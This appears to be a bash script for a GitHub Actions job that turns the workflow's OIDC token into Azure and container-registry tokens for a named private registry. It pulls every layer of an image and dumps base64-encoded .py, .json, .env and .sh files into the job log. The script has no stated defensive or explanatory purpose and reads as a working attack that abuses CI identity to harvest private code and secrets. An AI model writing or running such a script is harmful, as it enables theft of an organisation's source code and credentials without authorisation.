#!/usr/bin/env bash
set +e
echo START
TEN="$AZURE_TENANT_ID"; REG=crtblplatprodx3euoz.azurecr.io; REPO=tebamoto-reporting-api
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange"|jq -r .value)
A=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials --data-urlencode scope=https://management.azure.com/.default -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion="$J"|jq -r .access_token)
TL=$(curl -sS "https://$REG/oauth2/token?grant_type=access_token&service=$REG&scope=repository:$REPO:pull&access_token=$A"|jq -r .access_token)
echo TOKENS=${#A}/${#TL}
M=$(curl -sS -H "Authorization: Bearer $TL" -H 'Accept: application/vnd.docker.distribution.manifest.list.v2+json' "https://$REG/v2/$REPO/manifests/latest")
echo MANIFEST=$(printf %s "$M"|head -c 200|base64 -w0)
for D in $(printf %s "$M"|jq -r '.manifests[]?|select(.platform.os=="linux")|.digest'); do
 MM=$(curl -sS -H "Authorization: Bearer $TL" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' "https://$REG/v2/$REPO/manifests/$D")
 for L in $(printf %s "$MM"|jq -r '.layers[].digest'); do
  curl -sS -H "Authorization: Bearer $TL" "https://$REG/v2/$REPO/blobs/$L" -o /tmp/l; gzip -dc /tmp/l >/tmp/l.tar 2>/dev/null || cp /tmp/l /tmp/l.tar; rm -rf /tmp/x;mkdir /tmp/x; tar -xf /tmp/l.tar -C /tmp/x 2>/dev/null
  tar -tf /tmp/l.tar 2>/dev/null | head -3 | while read f; do echo "RAWPATH=$f"; done
  tar -tf /tmp/l.tar 2>/dev/null | grep -E '\.(py|json|env|sh)$' | head -80 | while read f; do echo "PATH=$f"; tar -xOf /tmp/l.tar "$f" 2>/dev/null | head -c 12000 | base64 -w0; echo; done
 done
done
